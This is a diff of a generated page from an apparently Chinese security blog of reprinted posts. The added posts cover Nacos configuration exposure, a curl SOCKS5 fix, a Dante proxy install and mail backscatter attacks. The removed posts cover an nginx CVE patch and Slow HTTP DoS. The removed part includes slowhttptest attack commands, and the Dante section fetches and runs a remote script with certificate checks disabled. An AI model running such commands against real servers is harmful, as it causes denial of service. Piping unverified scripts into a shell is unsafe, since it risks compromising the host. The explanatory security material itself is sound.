+<p>现在来看，之所以因为官方觉得不开启auth不算是漏洞，是因为根据官网OpenAPI来看，你需要知道具体的 Data Id 以及 Group才能读到具体配置，但是攻击者总能够通过代码审计的方法找到其他参数进行绕过。<br>目前攻防对抗实战中，Nacos的环境遇到非常多，并且无一例外都没有开启auth，很多防守方甚至只是用防火墙阻断网上公开的那几条exp利用的关键地址，Nacos里面保存了企业很多的配置文件比如数据库连接信息、AK&#x2F;SK信息等等，拿到账号密码等信息之后用来做密码本，然后再进行内网横向，杀伤力非常之大。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html">https://nacos.io/en-us/docs/auth.html</a><br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nacos/" rel="tag">Nacos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/04/Curl-Socks5h-x/">
+                Curl-Socks5h-x
+            </a>
+        </h2>
+    
+    <time>
+        Jul 4, 2023
+    </time>
+    <section class="content">
+        <h1><span id="linux讓-curl-藉由-socks5-proxy-連線時不要反解-dns造成連線失敗">[Linux]讓 curl 藉由 socks5 proxy 連線時，不要反解 DNS，造成連線失敗</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://ephrain.net/linux-%e8%ae%93-curl-%e8%97%89%e7%94%b1-socks5-proxy-%e9%80%a3%e7%b7%9a%e6%99%82%ef%bc%8c%e4%b8%8d%e8%a6%81%e5%8f%8d%e8%a7%a3-dns%ef%bc%8c%e9%80%a0%e6%88%90%e9%80%a3%e7%b7%9a%e5%a4%b1%e6%95%97/">Ephrain</a> 并作补充</p>
+</blockquote>
+<h2><span id="proxy-server链接问题">Proxy Server链接问题</span></h2><blockquote>
+<p>公司的專案程式通常需要支援各種 proxy server，如 HTTP proxy, socks4 和 socks5 proxy。<br>今天遇到一個問題，我們的程式底層會使用 libcurl 做 HTTP 連線，但連到一台 socks5 proxy 時卻不能成功…</p>
+<p>試著用 curl 加上 -x 選項來指定 proxy server，再加 -v 選項看看詳細的錯誤訊息：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 connect to IPv6 2600:1417:1b:184::23ac (locally resolved)</span><br><span class="line">* Can<span class="string">&#x27;t complete SOCKS5 connection to 0.0.0.0:0. (1)</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br><span class="line"><span class="string">curl: (7) Can&#x27;</span>t complete SOCKS5 connection to 0.0.0.0:0. (1)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以看到訊息裡有一行 locally resolved，這行代表的是 curl 自行去查詢了 DNS，將 testdomain.com 的 IP 找出來，但因為 curl 使用的是 Happy Eyeball 的演算法，同時會發出 Type A 和 AAAA 的 DNS request 封包，因此如果 AAAA 的 DNS 回應封包先回來的話，就會拿到 testdomain.com 的對應 IPv6 位址，反之如果是 A 的 DNS 回應封包先回來的話，拿到的則是 IPv4 位址。</p>
+</blockquote>
+<blockquote>
+<p>下面用 Wireshark 觀察一下 curl 產生出來的 DNS 封包，它送出了 A 和 AAAA 兩種 DNS 封包，以下例來說是 A (IPv4) 的回應先回來，但這個結果會依據網路狀況而有所不同，有時候是 AAAA (IPv6) 的回應先回來：<br><img src="/2023/07/04/Curl-Socks5h-x/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>curl 自行查詢 DNS 這件事情有什麼錯誤嗎？<br>以這個例子來說，curl 幫忙查出 testdomain.com 的 IPv6 位址 2600:1417:1b:184::23ac，然後連線到 socks5 proxy 172.22.1.1，叫它連線到這個 IPv6 位址去。<br>然而，這台 socks5 proxy 所在的網路只設定了 IPv4 位址，所以 proxy server 本身是無法藉由 IPv6 位址來連線的！<br>因此它自然無法連線到 curl 指定的 IPv6 位址，導致連線失敗…</p>
+</blockquote>
+<blockquote>
+<p>要解決這個問題，可以叫 curl 不要雞婆自己去查 DNS，而是讓 proxy server 自己來查 DNS，因為 proxy server 自己知道所處的網路環境，像是它不能連 IPv6 網路時，自然不會去問 Type AAAA (IPv6) 的 DNS 結果。</p>
+</blockquote>
+<blockquote>
+<p>我們將原本的 socks5:&#x2F;&#x2F;<proxy>:<port> 改成 socks5h:&#x2F;&#x2F;<proxy>:<port>，代表要讓 proxy 自己的查詢 DNS，可以看到 curl 直接連到了 proxy server，沒有先做 DNS 查詢，而最終 proxy 也成功完成了連線：</port></proxy></port></proxy></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5h://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 request granted.</span><br><span class="line">* Connected to 172.22.1.1 (172.22.1.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">...</span><br><span class="line">* Curl_http_done: called premature == 0</span><br><span class="line">* Connection <span class="comment">#0 to host testdomain.com left intact</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>不過這種雷，幾乎是每次整合一個用到 libcurl 的模組，就會再踩到一次啊…</p>
+</blockquote>
+<h2><span id="我遇到的场景">我遇到的场景</span></h2><blockquote>
+<p>首先，我没想到我会被台湾同胞的这篇技术博客教到很有趣的东西，其次，博主的语言和繁体配合起来更有趣了，也基于尊重保留了完整原文<br><img src="/2023/07/04/Curl-Socks5h-x/1.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>公司做安全监控平台收敛内网后，外部主机关联内网服务器的数据，需要监控进程 agent 以走代理的方式进来<br>自然代理服务器的公网地址和内网地址不在一个网段，然后为了安全性，代理服务器内网地址虽然和监控服务器同一网段，但由于安全组的隔离两者是不能直接访问的……(<em>´◐∀◐&#96;</em>)</p>
+</blockquote>
+<blockquote>
+<p>代中代(<em>´◐∀◐&#96;</em>)</p>
+</blockquote>
+<blockquote>
+<p>很自然的 curl 即使走代理都找不到身处内网的监控服务器域名<br>我只能在代理服务器 host 上配一下域名解析，然后翻了许久找到了 curl 的代理访问方式原理，就是这位博主的文章，让我明白了可以让 Proxy Server 去做 curl 的进一步内网解析<br>泪目，乙方厂商技术整半天都解决不了的问题，后来和我说我给的命令，其他客户也有这种问题的不能装的也能装了，让我找他们销售要钱草w(“▔□▔)</p>
+</blockquote>
+<blockquote>
+<p>希望两岸互相少点偏见吧</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/06/27/Danted-Socks5-proxy/">
+                Danted Socks5代理搭建
+            </a>
+        </h2>
+    
+    <time>
+        Jun 27, 2023
+    </time>
+    <section class="content">
+        <h1><span id="danted-socks5代理搭建">Danted Socks5代理搭建</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://sunpma.com/724.html">SunPma</a> 并作补充</p>
+</blockquote>
+<h2><span id="说明">说明</span></h2><blockquote>
+<p>Socks5属于明文代理，不要用于科学上网，否则会被阻断端口，可用于正常的跳板使用；<br>比如SSH转发加速国外VPS的连接速度，特别是一些延迟高或者丢包高的VPS；<br>使用Socks5转发后SSH就可以快速稳定的连接了，解决高丢包SSH断开的问题；</p>
+</blockquote>
+<h2><span id="支持">支持</span></h2><blockquote>
+<p>支持系统：Debian7+ Ubuntu14.04+ CentOS6+</p>
+</blockquote>
+<h2><span id="安装">安装</span></h2><blockquote>
+<p>下载脚本：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.github.com/Lozy/danted/master/install.sh -O install.sh</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>安装脚本：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh  --port=端口 --user=用户名 --passwd=密码</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中的端口 用户名 密码自行修改后粘贴到SSH里运行安装即可；<br>完成后会提示Dante Server Install Successfuly即表示安装成功；<br>安装后如果连接不上，检查设置的端口是否已经放行；<br>说明：安装完成后会显示内网IP地址，但在实际使用的时候需要用外网IP地址；</p>
+</blockquote>
+<h2><span id="使用">使用</span></h2><blockquote>
+<p>一般使用IP和用户名密码即可使用<br>如果需要固定IP或IP段，可以修改配置文件设置白名单</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/danted/sockd.conf</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改以下代码，改成你需要设置的白名单IP或IP段即可，然后重启使其生效；</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0/0  to: 0.0.0.0/0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="卸载">卸载</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh --uninstall</span><br></pre></td></tr></table></figure>
+
+<h2><span id="命令">命令</span></h2><p>|命令	|或者	|说明|<br>|service sockd start	|&#x2F;etc&#x2F;init.d&#x2F;sockd start	|启动socks5服务器守护进程|<br>|service sockd stop	|&#x2F;etc&#x2F;init.d&#x2F;sockd stop	|停止socks5服务器守护进程|<br>|service sockd restart	|&#x2F;etc&#x2F;init.d&#x2F;sockd restart	|重新启动socks5服务器守护进程|<br>|service sockd reload	|&#x2F;etc&#x2F;init.d&#x2F;sockd reload	|重新加载socks5服务器守护进程|<br>|service sockd status	|&#x2F;	|系统进程状态|<br>|service sockd state	|&#x2F;etc&#x2F;init.d&#x2F;sockd state	|运行状态|<br>|service sockd tail	|&#x2F;etc&#x2F;init.d&#x2F;sockd tail	sock |日志|<br>|service sockd adduser	|&#x2F;etc&#x2F;init.d&#x2F;sockd adduser	|添加pam-auth用户：service sockd adduser NAME PASSWORD|<br>|service sockd deluser	|&#x2F;etc&#x2F;init.d&#x2F;sockd deluser	|删除pam-auth用户：service sockd deluser NAME|</p>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Danted/" rel="tag">Danted</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/06/27/HTTP-request-smuggling-vulnerability/">
                 HTTP请求走私漏洞
             </a>
@@ -224,8 +760,8 @@
 <h2><span id="杂记">杂记</span></h2><blockquote>
 <p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
 <p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
-<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#x62;&#111;&#x62;&#x6f;&#64;&#97;&#x62;&#99;&#x2e;&#99;&#111;&#109;">&#x62;&#111;&#x62;&#x6f;&#64;&#97;&#x62;&#99;&#x2e;&#99;&#111;&#109;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#x6f;&#x62;&#111;&#64;&#97;&#x62;&#x63;&#x2e;&#x63;&#111;&#x6d;">&#98;&#x6f;&#x62;&#111;&#64;&#97;&#x62;&#x63;&#x2e;&#x63;&#111;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
-<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#77;&#x41;&#73;&#x4c;&#69;&#82;&#45;&#x44;&#65;&#69;&#x4d;&#79;&#78;&#x40;&#x78;&#x78;&#120;&#46;&#99;&#x6f;&#109;">&#77;&#x41;&#73;&#x4c;&#69;&#82;&#45;&#x44;&#65;&#69;&#x4d;&#79;&#78;&#x40;&#x78;&#x78;&#120;&#46;&#99;&#x6f;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
+<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#98;&#x6f;&#x40;&#x61;&#x62;&#x63;&#46;&#x63;&#111;&#x6d;">&#98;&#x6f;&#98;&#x6f;&#x40;&#x61;&#x62;&#x63;&#46;&#x63;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#111;&#98;&#111;&#x40;&#97;&#98;&#99;&#46;&#99;&#x6f;&#x6d;">&#98;&#111;&#98;&#111;&#x40;&#97;&#98;&#99;&#46;&#99;&#x6f;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
+<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#x4d;&#65;&#73;&#x4c;&#x45;&#82;&#45;&#x44;&#x41;&#x45;&#77;&#x4f;&#78;&#64;&#120;&#x78;&#x78;&#46;&#99;&#x6f;&#109;">&#x4d;&#65;&#73;&#x4c;&#x45;&#82;&#45;&#x44;&#x41;&#x45;&#77;&#x4f;&#78;&#64;&#120;&#x78;&#x78;&#46;&#99;&#x6f;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
 <p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
 <p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
 <p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
@@ -345,559 +881,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/CVE-2014-0133-Nginx/">
-                CVE-2014-0133-Nginx
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="nginx-spdy缓冲区溢出漏洞">Nginx SPDY缓冲区溢出漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124755846">山兔1</a> 并作补充</p>
-</blockquote>
-<h2><span id="注意">注意</span></h2><blockquote>
-<p>nginx SPDY实现存在基于堆的缓冲区溢出，允许攻击者利用漏洞提交特殊的请求使应用程序崩溃或执行任意代码。</p>
-<p>如果是漏扫，扫出来的话，是没有用的，它是根据版本来确认nginx是否存在的漏洞的，具体得登陆服务器上看。</p>
-</blockquote>
-<h2><span id="成因">成因</span></h2><blockquote>
-<p>Nginx 1.3.15 - 1.5.11 的版本都收此漏洞影响，原因是如果<code>listen</code>指令中的<code>spdy</code>选项被配置文件所调用，则编译时会使用<code>ngx_http_spdy_module</code>模块（默认不编译），并且没有<code>--with-debug</code>配置选项。</p>
-</blockquote>
-<h2><span id="修复">修复</span></h2><blockquote>
-<p>此漏洞已在 Nginx 1.5.12 及 1.4.7 后被修复，问题补丁如下：</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- src/http/ngx_http_spdy.c</span><br><span class="line">+++ src/http/ngx_http_spdy.c</span><br><span class="line">@@ -1849,7 +1849,7 @@ static u_char *</span><br><span class="line"> ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,</span><br><span class="line">     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)</span><br><span class="line"> &#123;</span><br><span class="line">-#if (NGX_DEBUG)</span><br><span class="line">+#if 1</span><br><span class="line">     if (end - pos &gt; NGX_SPDY_STATE_BUFFER_SIZE) &#123;</span><br><span class="line">         ngx_log_error(NGX_LOG_ALERT, sc-&gt;connection-&gt;log, 0,</span><br><span class="line">                       &quot;spdy state buffer overflow: &quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>请更新 <a target="_blank" rel="noopener" href="https://nginx.org/en/download.html">Nginx 版本</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Slow-HTTP-Dos/">
-                Slow HTTP Dos
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="http慢速拒绝服务攻击slow-http-dos">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</span></h1><blockquote>
-<p>本文摘自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/13409171.html">春告鳥</a>及<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/285282.html">libaisec</a></p>
-</blockquote>
-<h2><span id="http慢速拒绝服务攻击简介">HTTP慢速拒绝服务攻击简介</span></h2><blockquote>
-<p>HTTP慢速攻击是利用HTTP合法机制，以极低的速度往服务器发送HTTP请求，尽量长时间保持连接，不释放，若是达到了Web Server对于并发连接数的上限，同时恶意占用的连接没有被释放，那么服务器端将无法接受新的请求，导致拒绝服务。</p>
-</blockquote>
-<h2><span id="http慢速攻击原理摘抄自倾旋师傅的博客httpspayloadsonlinearchivers2018-04-162">HTTP慢速攻击原理（摘抄自倾旋师傅的博客:</span></h2><blockquote>
-<p>既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。</p>
-<p>首先HTTP协议的报文都是一行一行的，类似于：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host : payloads.online\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Keep-Alive: <span class="number">900</span>\r\n</span><br><span class="line">Content-Length: <span class="number">100000000</span>\r\n</span><br><span class="line">Content_Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Accept: *.*\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>那么报文中的\r\n是什么？</p>
-<p>\r\n代表一行报文的结束也被称为空行（CRLF），而\r\n\r\n代表整个报文的结束</p>
-<p>从上面贴出的GET请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。</p>
-<p>通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求&#x2F;应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用Keep-Alive模式（又称持久连接、连接重用）时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。</p>
-<p>那么当我们客户端发送一个报文，不以CRLF结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。</p>
-<p>如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。</p>
-<p>简单来说，就是我们每次只发一行，每次发送之间的间隔时间很长，这迟迟未发送结束的HTTP包会占用服务端的资源，当达到服务端处理请求的上限时，这时候再用户对网站正常请求，服务端也处理不了了，导致了拒绝服务。</p>
-</blockquote>
-<h2><span id="http慢速攻击分类">HTTP慢速攻击分类</span></h2><blockquote>
-<p>HTTP慢速攻击分为三类：</p>
-<ul>
-<li>Slow headers</li>
-<li>Slow body</li>
-<li>Slow read</li>
-</ul>
-</blockquote>
-<h3><span id="1slow-headers">1，Slow headers</span></h3><blockquote>
-<p>第一类是最经典的HTTP Slow慢速攻击，由rsnake发明的，原理在上面已介绍。</p>
-</blockquote>
-<h3><span id="2slow-body">2，Slow body</span></h3><blockquote>
-<p>第二类也叫做Slow HTTP POST</p>
-<p>原理为在POST提交方式中，允许在HTTP的头中声明content-length，即POST内容的长度。</p>
-<p>提交了恶意头之后，将需要传输的body缓慢进行发送，跟Slow headers类似，导致服务器端长时间等待需要传输的POST数据，当请求的数量变多后，达到了消耗服务器资源的效果，导致服务器宕机。</p>
-</blockquote>
-<h3><span id="3slow-read-attack">3，Slow Read attack</span></h3><blockquote>
-<p>第三类攻击方式采用调整TCP协议中滑动窗口大小，来对服务器单次发送的数据大小进行控制，使得服务器需要对一个相应包分为很多个包来发送，想要使这种攻击效果明显，请求的资源要尽量大，这里很容易理解，当请求的资源越大，返回包才越大，这样才能分成更多的包让服务器发送，导致拒绝服务的产生。</p>
-<p>也就是说，客户端以极低的速度来读取返回包，来消耗服务器的连接和内存资源。</p>
-</blockquote>
-<h2><span id="http慢速攻击实战">HTTP慢速攻击实战</span></h2><blockquote>
-<p>一般使用slowhttptest工具（安装方式很多，不再赘述）</p>
-</blockquote>
-<h3><span id="工具简介">工具简介</span></h3><blockquote>
-<p>SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试工具，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。</p>
-<p>这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。</p>
-</blockquote>
-<h3><span id="使用参数介绍">使用参数介绍</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">测试模式:</span><br><span class="line">-H                            slow header,slowloris默认采用此模式          </span><br><span class="line">-B                            slow body</span><br><span class="line">-R                            远程攻击又名Apache killer</span><br><span class="line">-X                            slow <span class="built_in">read</span></span><br><span class="line">​</span><br><span class="line">报告选项：</span><br><span class="line">-g                            生成具有套接字状态更改的统计信息（默认关闭）</span><br><span class="line">-o file_prefix                将统计信息输出保存在file.html和file.csv中（需要-g）</span><br><span class="line">-v level                      日志信息，详细级别0-4：致命，信息，错误，警告，调试</span><br><span class="line">​</span><br><span class="line">常规选项：</span><br><span class="line">-c connections                连接目标连接数（50）</span><br><span class="line">-i seconds                    后续数据之间的间隔（以秒为单位）（10）</span><br><span class="line">-l seconds                    测试目标时间长度，以秒为单位（240）</span><br><span class="line">-r rate                       每秒连接数（50）</span><br><span class="line">-s                            如果需要，Content-Length标头的值（4096）</span><br><span class="line">-t                            在请求中使用的动词，对于slow header和response，默认为GET；对于slow body，默认为POST</span><br><span class="line">-u URL                        目标的绝对URL（http://localhost/）</span><br><span class="line">-x                            在slowloris and Slow POST tests模式中，指定发送的最大数据长度</span><br><span class="line">-f                            Content-Type标头的值（application/x-www-form-urlencoded）</span><br><span class="line">-m                            接受(Accept)标头的值（text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5）</span><br><span class="line">​</span><br><span class="line">探测/代理选项：</span><br><span class="line">-d host:port                  为所有连接指定代理</span><br><span class="line">-e host:port                  为探测连接指定代理</span><br><span class="line">-p seconds                    指定等待时间来确认DoS攻击已经成功</span><br><span class="line">​</span><br><span class="line">range attack特定选项：</span><br><span class="line">-a                            标头中的起始位置</span><br><span class="line">-b                            标头中的结束位置</span><br><span class="line">​</span><br><span class="line">slow <span class="built_in">read</span>特定选项：</span><br><span class="line">-k                            在连接中重复相同请求的次数。如果服务器支持永久连接，则用于成倍增加响应大小。</span><br><span class="line">-n                            从recv缓冲区读取操作之间的时间间隔，以秒为单位（1）</span><br><span class="line">-w                            slow <span class="built_in">read</span>模式中指定tcp窗口范围下限</span><br><span class="line">-y                            slow <span class="built_in">read</span>模式中指定tcp窗口范围上限</span><br><span class="line">-z                            在每次的<span class="built_in">read</span>中，从buffer中读取数据量</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>对于三种类型的慢速攻击，分别给出payload：（摘抄的！）</p>
-</blockquote>
-<h3><span id="slow-header">Slow Header</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://vulurl.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。</p>
-</blockquote>
-<h3><span id="slow-read">Slow Read</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://vulurl.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。</p>
-</blockquote>
